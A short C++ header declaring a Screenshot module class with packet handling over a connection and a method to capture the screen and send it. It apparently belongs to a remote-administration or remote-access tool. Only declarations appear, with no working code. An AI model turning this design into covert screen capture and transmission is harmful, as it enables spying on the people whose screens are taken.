#pragma once
#include "bone_obj.h"

class Screenshot :public BoneObj
{
public:
	virtual void OnInit();
	virtual void OnPacketArrived(BYTE*, size_t);
	virtual void OnExit();
	Screenshot(Connection*);
	~Screenshot();
private:
	bool CapureScreenshotAndSend();
};